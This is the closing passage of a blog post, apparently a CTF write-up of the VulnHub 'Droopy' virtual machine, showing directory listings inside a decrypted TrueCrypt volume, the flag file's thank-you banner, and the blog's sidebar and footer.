+</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 .
+</span><span class='line'>drwxr-xr-x 6 root root  4096 May  4 16:20 ..
+</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
+</span><span class='line'>drwx------ 2 root root 12288 Apr 12  2016 lost+found
+</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
+</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A hidden directory..with another hidden directory inside it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret# ls -la
+</span><span class='line'>total 64
+</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .
+</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
+</span><span class='line'>-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
+</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 .top</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And finally, the flag!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt 
+</span><span class='line'>
+</span><span class='line'>################################################################################
+</span><span class='line'>#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
+</span><span class='line'>#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
+</span><span class='line'># | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
+</span><span class='line'>#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
+</span><span class='line'>#                                                                              #
+</span><span class='line'>################################################################################
+</span><span class='line'>
+</span><span class='line'>Firstly, thanks for trying this VM. If you have rooted it, well done!
+</span><span class='line'>
+</span><span class='line'>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
+</span><span class='line'>goes to barrebas and junken for help in testing and final configuration.
+</span><span class='line'>                                                                    --knightmare</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ You will be awarded a medal for        \
+</span><span class='line'>\ disregarding safety in saving someone. /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-05-04T13:05:08-04:00" pubdate data-updated="true">May 4<span>th</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/04/22/lfcs-prep-managing-docker-containers/" title="Previous Post: LFCS prep - Managing Docker containers">&laquo; LFCS prep - Managing Docker containers</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2018/05/13/hacking-the-milnet/" title="Next Post: Hacking the Milnet">Hacking the Milnet &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2018/05/04/dropping-droopy/';
+        var disqus_url = 'http://chousensha.github.io/blog/2018/05/04/dropping-droopy/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
